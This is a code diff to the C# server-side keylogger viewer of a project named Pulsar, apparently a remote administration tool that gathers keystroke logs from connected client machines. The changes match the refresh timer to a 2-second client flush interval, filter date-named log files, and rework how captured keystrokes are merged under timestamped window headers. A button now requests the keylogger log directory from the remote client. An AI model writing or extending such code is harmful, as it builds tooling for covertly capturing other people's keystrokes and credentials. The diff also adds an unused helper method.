@@ -1,5 +1,6 @@
 ﻿using Pulsar.Common.Helpers;
 using Pulsar.Common.Messages;
+using Pulsar.Common.Messages.Monitoring.KeyLogger;
 using Pulsar.Server.Forms.DarkMode;
 using Pulsar.Server.Helper;
 using Pulsar.Server.Messages;
@@ -53,8 +54,8 @@ namespace Pulsar.Server.Forms
 
             RegisterMessageHandler();
 
-            // SYNC WITH CLIENT: 3-second refresh to match keylogger flush interval
-            autoRefreshTimer.Interval = 3000;
+            // SYNC WITH CLIENT: 2-second refresh to match keylogger flush interval
+            autoRefreshTimer.Interval = 2000;
             autoRefreshTimer.Tick += AutoRefreshTimer_Tick;
 
             InitializeFileWatcher();
@@ -186,13 +187,19 @@ namespace Pulsar.Server.Forms
                 lstLogs.Items.Clear();
                 try
                 {
+                    // Regex: 2025-11-10.txt or 2025-11-10_01.txt
+                    var validPattern = new System.Text.RegularExpressions.Regex(@"^\d{4}-\d{2}-\d{2}(?:_\d{2})?\.txt$");
+
                     var files = new DirectoryInfo(Path.GetTempPath())
                         .GetFiles("*.txt")
-                        .OrderByDescending(f => f.LastWriteTime);
+                        .Where(f => validPattern.IsMatch(f.Name)) // ✅ filter only valid log filenames
+                        .OrderByDescending(f => f.LastWriteTime)
+                        .ToList();
 
                     foreach (var file in files)
                         lstLogs.Items.Add(new ListViewItem(file.Name));
 
+                    // Restore previous selection if it still exists
                     if (!string.IsNullOrEmpty(previouslySelected))
                     {
                         var item = lstLogs.Items.Cast<ListViewItem>()
@@ -319,7 +326,6 @@ namespace Pulsar.Server.Forms
 
             var lines = content.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
             var merged = new StringBuilder();
-
             string currentHeader = null;
             StringBuilder textBuffer = new StringBuilder();
 
@@ -328,54 +334,59 @@ namespace Pulsar.Server.Forms
                 var trimmed = line.Trim();
                 if (string.IsNullOrEmpty(trimmed)) continue;
 
-                // Detect timestamp + window line
+                // Header detection: [HH:MM:SS]
                 if (trimmed.StartsWith("[") && trimmed.Contains("]"))
                 {
-                    // Flush previous text buffer
-                    if (currentHeader != null && textBuffer.Length > 0)
+                    if (currentHeader != null)
                     {
-                        string mergedText = textBuffer.ToString()
-                            .Replace("  ", " ")         // collapse double spaces
-                            .Replace(" \n", "\n")       // fix spaces before line breaks
-                            .Trim();
-
                         merged.AppendLine(currentHeader);
-                        merged.AppendLine(mergedText);
+                        if (textBuffer.Length > 0)
+                            merged.AppendLine(textBuffer.ToString());
                         textBuffer.Clear();
                     }
-
-                    // Avoid duplicate consecutive headers
-                    if (currentHeader != trimmed)
-                        currentHeader = trimmed;
+                    currentHeader = trimmed;
                 }
                 else
                 {
-                    // Fix accidental letter splits like "t o" -> "to", "b etween" -> "between"
-                    string fixedLine = System.Text.RegularExpressions.Regex.Replace(
-                        trimmed, @"(\b\w)\s+(\w\b)", "$1$2"
-                    );
-
+                    // Append with a space only if last char is a letter/number and first char is NOT lowercase continuation
                     if (textBuffer.Length > 0)
-                        textBuffer.Append(" " + fixedLine);
-                    else
-                        textBuffer.Append(fixedLine);
+                    {
+                        char lastChar = textBuffer[^1];
+                        char firstChar = trimmed[0];
+
+                        if (char.IsLetterOrDigit(lastChar) && char.IsLetterOrDigit(firstChar))
+                        {
+                            // Only remove space if it’s a lowercase continuation (like broken word)
+                            if (char.IsLower(lastChar) && char.IsLower(firstChar))
+                                ; // merge without space
+                            else
+                                textBuffer.Append(" "); // normal word separation
+                        }
+                        else
+                        {
+                            textBuffer.Append(" ");
+                        }
+                    }
+                    textBuffer.Append(trimmed);
                 }
             }
 
-            // Flush final buffer
             if (currentHeader != null)
             {
                 merged.AppendLine(currentHeader);
                 if (textBuffer.Length > 0)
-                {
-                    string mergedText = textBuffer.ToString()
-                        .Replace("  ", " ")
-                        .Trim();
-                    merged.AppendLine(mergedText);
-                }
+                    merged.AppendLine(textBuffer.ToString());
             }
 
             return merged.ToString();
+        }
+
+        // Only remove spaces between letters, not between words or numbers
+        private string FixBrokenLetters(string text)
+        {
+            return System.Text.RegularExpressions.Regex.Replace(
+                text, @"(?<=\w)\s(?=\w)", ""
+            );
         }
 
         private void SafeInvoke(Action action)
@@ -386,10 +397,11 @@ namespace Pulsar.Server.Forms
                 action();
         }
 
-        private void button1_Click(object sender, EventArgs e)
+        private async void button1_Click(object sender, EventArgs e)
         {
-            RefreshSelectedLog();
+            _connectClient.Send(new GetKeyloggerLogsDirectory());
         }
+
 
         private void checkBox1_CheckedChanged_1(object sender, EventArgs e)
         {
